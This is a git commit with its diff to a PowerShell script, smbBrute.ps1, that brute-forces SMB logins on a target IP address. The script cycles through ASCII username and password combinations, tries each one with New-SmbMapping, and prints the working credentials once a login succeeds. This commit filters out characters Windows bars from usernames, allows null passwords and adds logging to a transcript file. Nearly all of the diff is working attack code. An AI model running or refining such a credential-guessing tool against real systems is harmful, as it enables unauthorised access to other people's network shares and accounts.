4ab57302e20b0ccca99ee2fd3b23ac8b7517fae9
oykumelikoglu <oykumelikoglu@gmail.com>
2018-04-01 01:23:54 +0300

    Added constraints for usernames
    Windows does not let users use some characters ( / \ [ ] : ; | = , + * ? < > % ), no need to search for these characters inside usernames. However since null can be used within passwords, it is added.

--- smbBrute.ps1
+++ smbBrute.ps1
@@ -1,4 +1,8 @@
 ﻿param ($IPAddr = $(throw "Need IP Address"))
+# TODO: Add params for Max Length etc.
+
+# TODO: Add output file types XML, TXT, EXCEL
+Start-Transcript -path output.txt # TODO: Add timestamp
 
 # TODO: Just checks ASCII since the letters are the most used, for more Unicode values a parameter can be added
 $LastASCIINum = 126 
@@ -7,14 +11,22 @@ $MaxLength = 1
 $OldMaxLength = 0
 $MaxLengthInc = 1 # Incrementation value to update the maximum length for username and password
 
-Start-Transcript -path C:\Users\oyku_\Desktop\file2.txt
+# Usernames can not contain   / \ [ ] : ; | = , + * ? < > %
+$avoid =  34, 47, 92, 91, 93, 58, 59, 124, 61, 44, 43, 42, 63, 60, 62, 37
 
 function updateList{
-param ([int[]]$list)
+param ([int[]]$list, [bool] $isUsername)
 
 for ($i = $list.Length-1; $i -ge 0 ; $i--){
     $list[$i] ++
-    if ( $list[$i] -gt $LastASCIINum ){
+
+    if ( $isUsername -and $avoid -contains $list[$i]){
+        $i++ #process again
+    }
+    elseIf ($list[$i] -eq 1 ){ #if it was null
+        $list[$i] = $FirstASCIINum - 1
+    }
+    elseIf ( $list[$i] -gt $LastASCIINum ){
         if ($i -ne 0 ){
             $list[$i] = $FirstASCIINum
         }
@@ -41,13 +53,12 @@ $out = $null;
 
 function brute {
 
-[int[]]$userPtr =  $FirstASCIINum # username can not be null
-[int[]]$passPtr =  $FirstASCIINum - 1 # password can be null
+[int[]]$userPtr =  $FirstASCIINum # username can not be space
+[int[]]$passPtr =  0 # password can be null
 $user = createString $userPtr #changes to String
 $pass = createString $passPtr #changes to String
 $Result = $null
 
-# TODO: username can't be null, space and can not use some characters ( " / \ [ ] : ; | = , + * ? < > ) , password does not have null (except just null), 
 #Continue till find a match
 :outer while ($true) {
 
@@ -55,17 +66,19 @@ while ($userPtr.Length -le $MaxLength) {
 
     while ($passPtr.Length -le $MaxLength){ #check pass for this user
         $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password $pass -EA SilentlyContinue
-        if ($Result -ne $null){
+           # TODO: Check if the server is on
+        if ( $Result -ne $null ){
+            Write-Host "SUCCESS -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
             break outer
         }
         Write-Host "FAILED -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
-        $passPtr = updateList $passPtr
+        $passPtr = updateList $passPtr $false
         $pass = createString $passPtr
     }
-    $userPtr = updateList $userPtr
+    $userPtr = updateList $userPtr $true
     $user = createString $userPtr 
     if ( $OldMaxLength -eq 0 -or $userPtr.Length -gt $OldMaxLength) {
-        $passPtr =  $FirstASCIINum - 1 # needs to start from the beginning
+        $passPtr =  0 # needs to start from the beginning
     }
     else {
         $passPtr =   @($FirstASCIINum) * ($OldMaxLength+1)
